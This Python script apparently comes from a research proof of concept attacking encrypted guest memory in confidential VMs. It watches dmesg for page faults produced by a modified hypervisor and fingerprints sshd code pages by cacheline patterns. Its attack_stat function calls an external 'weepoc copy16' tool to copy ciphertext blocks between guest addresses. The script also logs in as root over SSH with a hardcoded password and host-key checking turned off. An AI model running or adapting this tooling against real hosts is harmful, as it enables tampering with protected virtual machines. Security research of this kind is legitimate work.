import re
import time
import subprocess
from collections import Counter
import queue
import hashlib
import select
import sys
import os


def normal_test():
    # regex match the pf field
    PF_PATTERN = re.compile(r'page_fault_handle_page_track:.*?pf: ([0-9a-fA-F]+)')
    counter = Counter()
    # start the dmesg --follow subprocess
    with subprocess.Popen(['dmesg', '--follow'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, bufsize=1) as proc:
        for line in proc.stdout:
            match = PF_PATTERN.search(line)
            if match:
                pf_addr = match.group(1)
                counter[pf_addr] += 1
                print(f"new pf: {pf_addr}，current count: {counter[pf_addr]}\n")

def auto_pagefault_stat(count=10):
    import threading
    PF_PATTERN = re.compile(r'page_fault_handle_page_track:.*?pf: ([0-9a-fA-F]+)')
    WEEPOC_CMD = ['./poc', 'pagefault']
    ROUNDS = count
    NO_FAULT_TIMEOUT = 4  # seconds

    pf_queue = queue.Queue()  # thread-safe queue (timestamp, pf_addr)
    cmd_event = threading.Event()  # notify the command thread to execute
    cmd_done_event = threading.Event()  # notify the main control to finish the command
    stop_event = threading.Event()

    global_counter = Counter()  # new global statistics

    # listen thread
    def listen_pf(stop_event, pf_queue):
        with subprocess.Popen(['dmesg', '--follow'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, bufsize=1) as proc:
            for line in proc.stdout:
                match = PF_PATTERN.search(line)
                if match:
                    pf_addr = match.group(1)
                    pf_queue.put((time.time(), pf_addr))
                if stop_event.is_set():
                    break

    # command thread
    def command_worker(cmd_event, cmd_done_event, stop_event):
        while not stop_event.is_set():
            cmd_event.wait()
            if stop_event.is_set():
                break
            print("execute ./poc ...")
            subprocess.run(WEEPOC_CMD)
            cmd_event.clear()
            cmd_done_event.set()

    listener = threading.Thread(target=listen_pf, args=(stop_event, pf_queue))
    commander = threading.Thread(target=command_worker, args=(cmd_event, cmd_done_event, stop_event))
    listener.daemon = True
    commander.daemon = True
    listener.start()
    commander.start()
    print("start to listen page fault...\n")
    for round_idx in range(ROUNDS):
        # notify the command thread to execute poc
        cmd_done_event.clear()
        cmd_event.set()
        cmd_done_event.wait()  # wait for the command thread to finish
        last_pf_time = time.time()
        
        # Execute SSH connection in each round
        try:
            print("try to ssh login...")
            # use sshpass to automatically input the password for SSH login
            result = subprocess.run([
                'sshpass', '-p', 'password',  # modify the password according to the actual password
                'ssh', '-o', 'StrictHostKeyChecking=no',
                '-p', '2221',
                'root@127.0.0.1',  # modify the username and host according to the actual username and host
                'ls -la && ps aux'
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, timeout=5)
            
            if result.returncode == 0:
                print("ssh login success")
            else:
                print(f"ssh login failed: {result.stderr}")                
        except Exception as e:
            print(f"ssh login exception: {e}")
        
        print(f"\n=== round {round_idx+1} ===")
        while True:
            try:
                ts, pf_addr = pf_queue.get(timeout=0.1)
                global_counter[pf_addr] += 1  # global statistics
                last_pf_time = ts
            except queue.Empty:
                pass
            if time.time() - last_pf_time > NO_FAULT_TIMEOUT:
                break
        # only output the top 20 addresses in each round
        TOP_N = 20
        print(f"round {round_idx+1} end, total page fault: {sum(global_counter.values())}")
        print(f"{'PF address':<18} {'count':>8}")
        print("-" * 28)
        for addr, cnt in global_counter.most_common(TOP_N):
            print(f"{addr:<18} {cnt:>8}")
    stop_event.set()
    print("\n=== 20 rounds end ===\n")
    # final global statistics table
    total_pf = sum(global_counter.values())
    print(f"total page fault: {total_pf}")

    
    # write to file
    with open('pagefault_stats.txt', 'w') as f:
        f.write(f"total page fault: {total_pf}\n")
        f.write(f"{'PF address':<18} {'count':>8}\n")
        f.write("-" * 28 + "\n")
        
        # extract the address with count greater than (ROUNDS-5)
        frequent_pages = []
        for addr, cnt in sorted(global_counter.items(), key=lambda x: x[1], reverse=True):
            print(f"{addr:<18} {cnt:>8}")
            f.write(f"{addr:<18} {cnt:>8}\n")
            if cnt > (ROUNDS - 5):  # if the count is greater than 5
                frequent_pages.append(addr)
        
        # print the frequent page address
        print("\nfrequent page address(count>5):")
        for addr in frequent_pages:
            print(f"0x{addr}")
            
        # write the frequent page address to file
        f.write("\nfrequent page address(count>5):\n")
        for addr in frequent_pages:
            f.write(f"0x{addr}\n")
            
        return frequent_pages  # return the list of frequent page addresses

# def get_page_md5(gpa):
#     # regex match the line like 'kvm_amd: gpa 0x10e010000, group 0, feature_sum = 0'
#     pattern = re.compile(r'kvm_amd: gpa (0x[0-9a-f]+), group (\d+), feature_sum = (\d+)')
#     # store the feature values
#     features = []
#     # start listening dmesg
#     # ./weepoc getfeature 0x000000010bca1000
#     cmd = "sudo ./weepoc getfeature {}".format(gpa)
#     os.system(cmd)
#     with subprocess.Popen(['dmesg', '--follow'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, bufsize=1) as process:
#         try:
#             while True:
#                 line = process.stdout.readline()
#                 if not line:
#                     break
#                 match = pattern.search(line)
#                 if match:
#                     extracted_gpa = match.group(1)
#                     # compare the gpa
#                     if extracted_gpa != gpa:
#                         print(f"gpa not match: {extracted_gpa} != {gpa}")
#                         continue
#                     group = int(match.group(2))
#                     feature_sum = int(match.group(3))
#                     features.append(feature_sum)
#                     if len(features) >= 64:
#                         process.terminate()
#                         break
#         except KeyboardInterrupt:
#             print("user interrupt, exit...")
#             process.terminate()
#     # ensure the number of features is 64
#     if len(features) < 64:
#         features.extend([0] * (64 - len(features)))
#     else:
#         features = features[:64]
#     # calculate md5
#     feature_bytes = ','.join(str(f) for f in features).encode('utf-8')
#     md5sum = hashlib.md5(feature_bytes).hexdigest()
#     return md5sum

def analyze_binary_cacheline_features(bin_path, page_size=4096):
    page_md5s = []
    with open(bin_path, 'rb') as f:
        data = f.read()
    num_pages = len(data) // page_size
    for page_idx in range(num_pages):
        page_offset = page_idx * page_size
        print(f'Page {page_idx} offset address: 0x{page_offset:x}')
        page = data[page_idx*page_size:(page_idx+1)*page_size]
        num_groups = page_size // 64
        features = []
        for group_idx in range(num_groups):
            group = page[group_idx*64:(group_idx+1)*64]
            # 4 cachelines, each 16 bytes
            cachelines = [group[i*16:(i+1)*16] for i in range(4)]
            feature_sum = 0
            for i in range(4):
                for j in range(i+1, 4):
                    if cachelines[i] == cachelines[j]:
                        feature_sum += (i+1) + (j+1)
            features.append(feature_sum)
            # print(f'Page {page_idx}, Group {group_idx}, Feature = {feature_sum}')
        # calculate the md5 of each page
        feature_bytes = ','.join(str(f) for f in features).encode('utf-8')
        md5sum = hashlib.md5(feature_bytes).hexdigest()
        page_md5s.append(md5sum)
        print(f'Page {page_idx} feature sequence md5: {md5sum}')
    return page_md5s


index_map = {"a":2,"b":3,"c":0,"d":1,"e":2,"f":3,"4":0,"5":1,"6":2,"7":3,"8":0,"9":1,"0":2,"1":3,"2":0,"3":1}
def attack_stat(dst_addr, offset, replace_index1, replace_index2, replace_index3):
    addr_int = int(dst_addr, 16)  # because addr is a hex string
    src_addr = addr_int + offset 
    hex_str = hex(src_addr)[2:]  # remove '0x'
    second_last = hex_str[-2] if len(hex_str) >= 2 else '0'
    print(f"second last digit: {second_last}")
    current_index = index_map[second_last]  # get the index of the current position
    print(f"current_index: {current_index}")
    if replace_index1 >= 0:
        # calculate the distance to move forward
        move_distance = current_index - replace_index1
        dst_addr_1 = src_addr - move_distance * 0x10
    else:
        dst_addr_1 = 0
    if replace_index2 >= 0:
        move_distance = current_index - replace_index2
        dst_addr_2 = src_addr - move_distance * 0x10
    else:
        dst_addr_2 = 0
    if replace_index3 >= 0:
        move_distance = current_index - replace_index3
        dst_addr_3 = src_addr - move_distance * 0x10
    else:
        dst_addr_3 = 0
    # convert the address back to a hex string
    src_adddr = f"0x{src_addr:x}"
    dst_addr_1 = f"0x{dst_addr_1:x}"
    dst_addr_2 = f"0x{dst_addr_2:x}"
    dst_addr_3 = f"0x{dst_addr_3:x}"
    cmd = ['./weepoc', 'copy16', src_adddr, dst_addr_1, dst_addr_2, dst_addr_3]
    print(cmd)
    subprocess.run(cmd)
    return 0


def locat_page():
    frequent_pages = auto_pagefault_stat()
    from get_feature import get_page_md5
    for gpa in frequent_pages:
        gpa = "0x"+gpa
        get_page_md5(gpa)

if __name__ == '__main__':
    # bin_path = "/home/pw0rld/security-25/CSV-CipherShadow/CipherShadow-Attack/endtoend/sshd"
    # page_md5s = analyze_binary_cacheline_features(bin_path)
    # print(page_md5s)
    # attack_stat("0x6333000",0x6f0,2,1,-1)
    locat_page()
    # print(frequent_pages)
    # from get_feature import get_page_md5
    # for gpa in frequent_pages:
    #     # print(gpa)
    #     gpa = "0x"+gpa
    #     get_page_md5(gpa)
    # attack_stat(frequent_pages,0x1C0,page_md5s)


# All grouping scenarios for 4 blocks (15 types)
# | No. | Grouping scenario (example) | Grouping index | 4-bit encoding |
# |------|-------------------------|--------------------|-----------|
# | 0 | All different | [0], [1], [2], [3] | 0000 |
# | 1 | 0=1, 2, 3 | [0,1], [2], [3] | 0001 |
# | 2 | 0=2, 1, 3 | [0,2], [1], [3] | 0010 |
# | 3 | 0=3, 1, 2 | [0,3], [1], [2] | 0011 |
# | 4 | 1=2, 0, 3 | [1,2], [0], [3] | 0100 |
# | 5 | 1=3, 0, 2 | [1,3], [0], [2] | 0101 |
# | 6 | 2=3, 0, 1 | [2,3], [0], [1] | 0110 |
# | 7 | 0=1, 2=3 | [0,1], [2,3] | 0111 |
# | 8 | 0=2, 1=3 | [0,2], [1,3] | 1000 |
# | 9 | 0=3, 1=2 | [0,3], [1,2] | 1001 |
# | 10 | 0=1=2, 3 | [0,1,2], [3] | 1010 |
# | 11 | 0=1=3, 2 | [0,1,3], [2] | 1011 |
# | 12 | 0=2=3, 1 | [0,2,3], [1] | 1100 |
# | 13 | 1=2=3, 0 | [1,2,3], [0] | 1101 |
# | 14 | 0=1=2=3 | [0,1,2,3] | 1110 |


# All different (4 different)
# Notation: A B C D
# Grouping: [0], [1], [2], [3]
# 2. Two pairs are equal (6 types)
# (1) 0=1, 2, 3: A A B C → [0,1], [2], [3]
# (2) 0=2, 1, 3：A B A C → [0,2], [1], [3]
# (3) 0=3, 1, 2：A B C A → [0,3], [1], [2]
# (4) 1=2, 0, 3：A B B C → [1,2], [0], [3]
# (5) 1=3, 0, 2：A B C B → [1,3], [0], [2]
# (6) 2=3, 0, 1：A B C C → [2,3], [0], [1]
# 3. Two pairs are equal (3 types)
# (1) 0=1, 2=3：A A B B → [0,1], [2,3]
# (2) 0=2, 1=3：A B A B → [0,2], [1,3]
# (3) 0=3, 1=2：A B B A → [0,3], [1,2]
# 4. Three are equal, one different (4 types)
# (1) 0=1=2, 3: A A A B → [0,1,2], [3]
# (2) 0=1=3, 2: A A B A → [0,1,3], [2]
# (3) 0=2=3, 1: A B A A → [0,2,3], [1]
# (4) 1=2=3, 0: A B B B → [1,2,3], [0]